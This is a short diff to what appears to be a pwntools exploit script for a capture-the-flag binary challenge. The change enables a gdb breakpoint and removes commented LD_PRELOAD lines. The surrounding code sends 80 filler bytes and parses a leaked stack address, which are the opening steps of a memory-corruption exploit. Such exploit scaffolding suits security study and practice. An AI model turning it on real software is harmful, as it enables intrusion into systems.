@@ -18,8 +18,6 @@ context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
 elf = context.binary
 if sys.argv[1] == "l":
     context.log_level = "debug"
-    # env = {'LD_PRELOAD': ''}
-    # io = process("", env = env)
     io = process(elfPath)
     libc = elf.libc
 
@@ -45,7 +43,7 @@ def DEBUG(bps = [], pie = False):
     gdb.attach(io, cmd)
 
 if __name__ == "__main__":
-    #  DEBUG([0x400676])
+    DEBUG([0x400676])
     io.sendafter(">", '0' * 80)
     stack = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0'))
     success("stack", stack)
